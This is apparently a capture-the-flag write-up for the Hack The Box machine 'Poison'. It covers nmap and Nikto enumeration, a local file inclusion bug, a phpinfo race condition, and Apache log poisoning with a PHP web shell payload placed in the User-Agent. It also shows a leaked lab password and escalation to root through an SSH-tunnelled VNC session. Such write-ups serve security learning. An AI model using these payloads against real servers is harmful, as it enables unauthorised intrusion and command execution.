# Poison

## Information Gathering
10.10.10.84<br>
Poison<br>

Software Versions
- OpenSSH 7.2
- Apache httpd 2.4.29
- PHP 5.6.32

## Enumeration
Start with an nmap scan:
```bash
# Nmap 7.92 scan initiated Fri Feb 18 15:19:10 2022 as: nmap -sC -sV -oN nmap/poison.nmap 10.10.10.84
Nmap scan report for 10.10.10.84
Host is up (0.062s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
| ssh-hostkey: 
|   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)
|   256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)
|_  256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
|_http-title: Site doesnt have a title (text/html; charset=UTF-8).
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Feb 18 15:19:30 2022 -- 1 IP address (1 host up) scanned in 20.09 seconds

```
I also run a Nikto scan
```bash
- Nikto v2.1.6/2.1.5
+ Target Host: 10.10.10.84
+ Target Port: 80
+ GET Retrieved x-powered-by header: PHP/5.6.32
+ GET The anti-clickjacking X-Frame-Options header is not present.
+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ HEAD PHP/5.6.32 appears to be outdated (current is at least 7.2.12). PHP 5.6.33, 7.0.27, 7.1.13, 7.2.1 may also current release for each branch.
+ HEAD Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ TNNUJRCH Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-877: TRACE HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ GET /phpinfo.php: Output from the phpinfo() function was found.
+ OSVDB-12184: GET /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-3233: GET /phpinfo.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
```

## Exploitation
There are actually three known AV's for this box.

### Pwdbackup.txt
This is how you cheese the box.<br>
There is a file hosted on the webserver title pwdbackup.txt. Fetching this file yields a string which was encoded in base64 13 times. Decoding this gives you the password for a user. There is a LFI vulnerability for browse.php which allows you to exfiltrate information. The /etc/passwd file shows the username to be charix. This gives you foothold on the box.
```
charix:Charix!2#4%6&8(0
```

### PHP Race Condition
<a href="https://insomniasec.com/cdn-assets/LFI_With_PHPInfo_Assistance.pdf">This</a> research paper shows this really cool race condition when a webserver has the "file_upload" feature set and is also vulnerable to a LFI vulnerability. It's a bit dense so there is <a href="https://github.com/sinsinology/phpinfo-Local-File-Inclusion">this</a> PoC which is a bit easier to understand.<br>
Essentially what the script does is,
1. Make a very large request. This causes the server 2-3 ms extra time to compute and thus, the file stays on the server for much longer.
2. Use LFI to hit the file before it gets deleted from cache

I actually get the script off of <a href="https://github.com/swisskyrepo/PayloadsAllTheThings">PayloadAllTheThings</a>. <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/phpinfolfi.py">This</a> is the script I used. I made some minor changes such as the PHP payload to be used. I also had to change all instances of ">" into "&gt" because of PHP entities. You also have to remove the NULL byte in LFIREQ. After a few seconds, I get a reverse shell!<br>
Note: On BSD, files for the webserver are stored at /usr/local/www/apache24/data by default.

### Log Poisoning
This is the intended method for getting foothold on the box.<br>
The log file for apache2 in OpenBSD is located in /var/log/httpd-access.log. We can view this page using the LFI. The key thing to note is that the user-agent is included in the access log. Below is the result of me using cURL to get a file on the server
```
10.10.14.122 - - [20/Feb/2022:03:13:17 +0100] "GET /browse.php?file=/var/log/httpd-access.log HTTP/1.1" 200 5759905 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
10.10.14.122 - - [20/Feb/2022:03:13:18 +0100] "GET /favicon.ico HTTP/1.1" 404 209 "http://10.10.10.84/browse.php?file=/var/log/httpd-access.log" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
10.10.14.122 - - [20/Feb/2022:03:14:38 +0100] "GET /browse.php?file=/var/log/httpd-access.log HTTP/1.1" 200 5760312 "-" "curl/7.81.0"
```
Using <b><?php phpinfo(); ?></b> allows me to render the phpinfo of the server from the log file. I use the payload:
```php
Mozilla/5.0 <?php echo system($_GET['cmd']); ?> Firefox/78.0
```
In the user agent. After that it's as simple as setting the "cmd" parameter and executing commands to get a reverse shell.

## Privilege Escalation
Looking at all the services/processes running as root:
```bash
ps aux | grep ^root

root   620  0.0  0.7  57812  7052  -  Is   04:26    0:00.00 /usr/sbin/sshd
root   625  0.0  1.1  99172 11516  -  Ss   04:27    0:00.03 /usr/local/sbin/httpd -DNOHTTPACCEPT
root   643  0.0  0.6  20636  6140  -  Ss   04:28    0:00.02 sendmail: accepting connections (sendmail)
root   653  0.0  0.2  12592  2436  -  Is   04:28    0:00.00 /usr/sbin/cron -s
root   709  0.0  0.8  85228  7768  -  Is   04:29    0:00.01 sshd: charix [priv] (sshd)
root   529  0.0  0.9  23620  8872 v0- I    04:26    0:00.02 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority -geometry 1280x800 -depth 24 -rfbwait 120000 -rfbauth /root/.vnc/passwd -rfbport 5901 -loc
root   540  0.0  0.7  67220  7064 v0- I    04:26    0:00.02 xterm -geometry 80x24+10+10 -ls -title X Desktop
root   541  0.0  0.5  37620  5312 v0- I    04:26    0:00.01 twm
```
VNC is running as root. We can also see what services are running on what ports.
```bash
netstat -an | grep LISTEN

tcp4       0      0 127.0.0.1.25           *.*                    LISTEN
tcp4       0      0 *.80                   *.*                    LISTEN
tcp6       0      0 *.80                   *.*                    LISTEN
tcp4       0      0 *.22                   *.*                    LISTEN
tcp6       0      0 *.22                   *.*                    LISTEN
tcp4       0      0 127.0.0.1.5801         *.*                    LISTEN
tcp4       0      0 127.0.0.1.5901         *.*                    LISTEN
```
VNC is running on the localhost interface. We can perform a SSH tunnel/SSH port-forwarding. To port forward:
```bash
ssh -L 5901:127.0.0.1:5901 charix@10.10.10.84
```
This command pretty much says:
- Listen on my machine on port 5901 (-L)
- Any traffic that goes through ssh (ssh charix@10.10.10.84)
- Send to localhost on port 5901

We can use vncviewer to connect on our localhost. This goes through SSH and on the other side gets forwarded to 127.0.0.1
```bash
vncviewer -passwd secret 127.0.0.1::5901
``` 
This opens up a sort-of RDP session as root.
